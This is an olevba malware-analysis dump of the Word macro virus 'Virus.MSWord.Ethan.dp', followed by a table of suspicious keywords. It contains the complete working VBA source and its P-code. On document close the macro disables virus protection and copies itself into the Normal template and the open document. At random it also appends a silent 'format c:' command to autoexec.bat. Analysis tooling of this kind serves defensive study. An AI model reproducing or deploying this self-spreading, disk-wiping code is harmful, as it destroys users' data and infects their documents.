olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ethan.dp
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ethan.dp - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
On Error Resume Next
savename = ActiveDocument.Saved
With Options
     .ConfirmConversions = False
     .VirusProtection = 0
     .SaveNormalPrompt = 0
 End With
 Application.EnableCancelKey = Not -1
If Dir("c:\winsys.log", 6) = "" Then
Open "c:\winsys.log" For Output As #1
For i = 1 To MacroContainer.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
buff = MacroContainer.VBProject.VBComponents.Item(1).CodeModule.Lines(i, 1)
Print #1, buff
Next i
Close #1
SetAttr "c:\winsys.log", 6
End If
 daynum = Format(Date, "dd")
 monthnum = Format(Date, "mm")
 yearnum = Format(Date, "yyyy")
 reg = monthnum Mod 2
 Randomize
 Death = Int((10 * Rnd) + 1)
 If yearnum >= 2001 And Death = 5 Then
    If Dir("c:\autoexec.bat") <> "" Then
    cr = Chr(13) + Chr(10)
txt$ = " @echo ##############################################################################" + cr + "@echo ####         ##  #####  ##        ######      ####        ##  #####  #########" + cr + "@echo ####  #####  ##  ####   ########  #####  ###  ####  ########  #####  #########" + cr + "@echo ####  #####  ##  ### #  #######  #####  ####  ####  ########  #####  #########" + cr + "@echo ####  #####  ##  ## ##  #####   ######  ####  ####     #####  #####  #########" + cr + "@echo ####  #####  ##  # ###  #######  #####  ####  ####  ########  #####  #########" + cr + "@echo ####  #####  ##   ####  ########  ##            ##  ########  #####  #########" + cr + "@echo ####  #####  ##  #####  ##        ##  ########  ##        ##           #######" + cr + "@echo #####################################################################  #######" + cr + "@echo ##############################################################################" + cr
     SetAttr "c:\autoexec.bat", vbNormal
     str1$ = "@echo y|format c:/q/u >nul" + Chr(13) + Chr(10)
     Open "c:\autoexec.bat" For Binary Access Read Write As #1
     FileLength = LOF(1)
     str_ = Input(FileLength, #1)
     MyPos = InStr(1, str_, "path", 1)
     MyPos = InStr(MyPos, str_, Chr(13), 1)
     Put #1, MyPos + 2, txt$
     Put #1, , str1$
     Close #1
 End If
 End If
With NormalTemplate.VBProject.VBComponents.Item(1).CodeModule
    num = .CountOfLines
    .DeleteLines 1, num
    .AddFromFile "c:\winsys.log"
End With
With ActiveDocument.VBProject.VBComponents.Item(1).CodeModule
    num = .CountOfLines
    .DeleteLines 1, num
    .AddFromFile "c:\winsys.log"
End With
With Dialogs(wdDialogFileSummaryInfo)
    .Title = "BasTarD-2811"
    .Author = "$$$$$$"
    .Keywordsavename = "BasTarD-2811"
    .Execute
End With
If Left(ActiveDocument.Name, 8) <> "Document" Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
If ActiveDocument.Saved <> s Then ActiveDocument.Saved = s
End Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ethan.dp
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 5125 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	St savename 
' Line #3:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #4:
' 	LitVarSpecial (False)
' 	MemStWith ConfirmConversions 
' Line #5:
' 	LitDI2 0x0000 
' 	MemStWith VirusProtection 
' Line #6:
' 	LitDI2 0x0000 
' 	MemStWith SaveNormalPrompt 
' Line #7:
' 	EndWith 
' Line #8:
' 	LitDI2 0x0001 
' 	UMi 
' 	Not 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #9:
' 	LitStr 0x000D "c:\winsys.log"
' 	LitDI2 0x0006 
' 	ArgsLd Dir 0x0002 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #10:
' 	LitStr 0x000D "c:\winsys.log"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #11:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #12:
' 	Ld i 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld MacroContainer 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St buff 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	Ld buff 
' 	PrintItemNL 
' Line #14:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #16:
' 	LitStr 0x000D "c:\winsys.log"
' 	LitDI2 0x0006 
' 	ArgsCall SetAttr 0x0002 
' Line #17:
' 	EndIfBlock 
' Line #18:
' 	Ld Date 
' 	LitStr 0x0002 "dd"
' 	ArgsLd Format$ 0x0002 
' 	St daynum 
' Line #19:
' 	Ld Date 
' 	LitStr 0x0002 "mm"
' 	ArgsLd Format$ 0x0002 
' 	St monthnum 
' Line #20:
' 	Ld Date 
' 	LitStr 0x0004 "yyyy"
' 	ArgsLd Format$ 0x0002 
' 	St yearnum 
' Line #21:
' 	Ld monthnum 
' 	LitDI2 0x0002 
' 	Mod 
' 	St reg 
' Line #22:
' 	ArgsCall Read 0x0000 
' Line #23:
' 	LitDI2 0x000A 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St Death 
' Line #24:
' 	Ld yearnum 
' 	LitDI2 0x07D1 
' 	Ge 
' 	Ld Death 
' 	LitDI2 0x0005 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #25:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St cr 
' Line #27:
' 	LitStr 0x0055 " @echo ##############################################################################"
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo ####         ##  #####  ##        ######      ####        ##  #####  #########"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo ####  #####  ##  ####   ########  #####  ###  ####  ########  #####  #########"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo ####  #####  ##  ### #  #######  #####  ####  ####  ########  #####  #########"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo ####  #####  ##  ## ##  #####   ######  ####  ####     #####  #####  #########"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo ####  #####  ##  # ###  #######  #####  ####  ####  ########  #####  #########"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo ####  #####  ##   ####  ########  ##            ##  ########  #####  #########"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo ####  #####  ##  #####  ##        ##  ########  ##        ##           #######"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo #####################################################################  #######"
' 	Add 
' 	Ld cr 
' 	Add 
' 	LitStr 0x0054 "@echo ##############################################################################"
' 	Add 
' 	Ld cr 
' 	Add 
' 	St txt$ 
' Line #28:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	Ld vbNormal 
' 	ArgsCall SetAttr 0x0002 
' Line #29:
' 	LitStr 0x001A "@echo y|format c:/q/u >nul"
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	LitDI2 0x000A 
' 	ArgsLd Chr 0x0001 
' 	Add 
' 	St str1$ 
' Line #30:
' 	LitStr 0x000F "c:\autoexec.bat"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Binary Access Read Write)
' Line #31:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	St FileLength 
' Line #32:
' 	Ld FileLength 
' 	LitDI2 0x0001 
' 	Sharp 
' 	ArgsLd Input$ 0x0002 
' 	St str_ 
' Line #33:
' 	LitDI2 0x0001 
' 	Ld str_ 
' 	LitStr 0x0004 "path"
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	St MyPos 
' Line #34:
' 	Ld MyPos 
' 	Ld str_ 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	LitDI2 0x0001 
' 	FnInStr4 
' 	St MyPos 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Ld MyPos 
' 	LitDI2 0x0002 
' 	Add 
' 	Ld txt$ 
' 	PutRec 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Ld str1$ 
' 	PutRec 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #41:
' 	MemLdWith CountOfLines 
' 	St num 
' Line #42:
' 	LitDI2 0x0001 
' 	Ld num 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #43:
' 	LitStr 0x000D "c:\winsys.log"
' 	ArgsMemCallWith AddFromFile 0x0001 
' Line #44:
' 	EndWith 
' Line #45:
' 	StartWithExpr 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd CodeModule 
' 	With 
' Line #46:
' 	MemLdWith CountOfLines 
' 	St num 
' Line #47:
' 	LitDI2 0x0001 
' 	Ld num 
' 	ArgsMemCallWith DeleteLines 0x0002 
' Line #48:
' 	LitStr 0x000D "c:\winsys.log"
' 	ArgsMemCallWith AddFromFile 0x0001 
' Line #49:
' 	EndWith 
' Line #50:
' 	StartWithExpr 
' 	Ld wdDialogFileSummaryInfo 
' 	ArgsLd Dialogs 0x0001 
' 	With 
' Line #51:
' 	LitStr 0x000C "BasTarD-2811"
' 	MemStWith Title 
' Line #52:
' 	LitStr 0x0006 "$$$$$$"
' 	MemStWith Author 
' Line #53:
' 	LitStr 0x000C "BasTarD-2811"
' 	MemStWith Keywordsavename 
' Line #54:
' 	ArgsMemCallWith Execute 0x0000 
' Line #55:
' 	EndWith 
' Line #56:
' 	Ld ActiveDocument 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #57:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld ActiveDocument 
' 	MemSt Saved 
' 	EndIf 
' Line #58:
' 	EndSub 
' Line #59:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |autoexec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|vbNormal            |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

